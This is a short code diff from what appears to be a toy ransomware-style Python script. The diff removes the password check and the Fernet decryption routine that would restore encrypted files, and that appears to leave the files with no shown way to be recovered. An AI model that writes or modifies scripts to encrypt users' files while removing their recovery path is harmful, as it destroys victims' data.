@@ -32,25 +32,3 @@ time.sleep(5)
 password = "LOL"
 
 call(["python", "LOL.py"])
-userInput = input("LOL")
-time.sleep(1)
-
-# Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
-# and if its wrong a message saying that the password is wrong
-if userInput == password:
-	for file in files:
-		with open(file, "rb") as thefile:
-			contents = thefile.read()
-		contents_decrypted = Fernet(secretkey).decrypt(contents)
-		with open(file, "wb") as thefile:
-			thefile.write(contents_decrypted)
-	print(" ")
-
-else:
-	time.sleep(1)
-
-	
-	
-	
-	
-	
